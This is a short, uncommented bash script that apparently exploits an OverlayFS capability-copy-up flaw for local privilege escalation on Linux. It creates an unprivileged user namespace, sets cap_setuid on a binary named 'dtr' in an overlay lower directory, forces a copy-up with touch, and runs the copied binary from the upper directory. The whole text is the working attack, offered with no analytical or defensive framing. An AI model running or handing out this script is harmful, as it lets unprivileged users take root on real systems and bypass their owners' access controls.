#!/bin/bash

if [ -e "l" ] || [ -e "u" ] || [ -e "w" ] || [ -e "m" ]; then
    rm -rf l u w m
fi

unshare -rm sh -c "
    mkdir -p l u w m &&
    cp dtr l/ &&
    setcap cap_setuid+eip l/dtr &&
    mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &&
    touch m/dtr && 
    u/dtr;"

